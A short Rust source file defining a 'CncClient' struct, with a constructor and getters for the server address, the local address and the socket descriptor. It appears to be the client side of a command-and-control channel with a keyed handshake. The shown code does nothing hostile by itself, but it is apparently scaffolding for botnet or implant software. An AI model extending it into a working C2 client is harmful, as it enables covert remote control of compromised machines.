use std::{net::TcpStream, os::unix::prelude::{AsRawFd, RawFd}, time::SystemTime};

use libvoid::crypto::Crypto;


// CncClient struct
// The main struct of this crate. It will store everything needed
pub struct CncClient {
    addr: String,
    crypto: Crypto,
    stream: Option<TcpStream>,
    writebuf: Vec<u8>,
    readbuf: Vec<u8>,
    lastping: SystemTime,
    is_init: bool
}

impl CncClient {
    pub fn new(ip: &str, port: &str, helo_key: u32) -> CncClient {
        let addr = format!("{}:{}", ip, port);
        //TODO: Change addr to be a SocketAddr
        
        CncClient{
            addr,
            crypto: Crypto::new(helo_key), 
            stream: None, 
            writebuf: Vec::new(),
            readbuf: Vec::new(), 
            lastping: SystemTime::now(),
            is_init: false
        }
    }

    pub fn get_addr(&self) -> &str {
        &self.addr.as_ref()
    }

    pub fn get_local_addr(&self) -> String {
        match &self.stream {
            Some(stream) => stream.local_addr().unwrap().to_string(),
            None => "".to_string()
        }
    }

    pub fn get_fd(&self) -> RawFd {
        match &self.stream {
            Some(stream) => stream.as_raw_fd(),
            None => -1
        }
    }
}

mod net;
mod handler;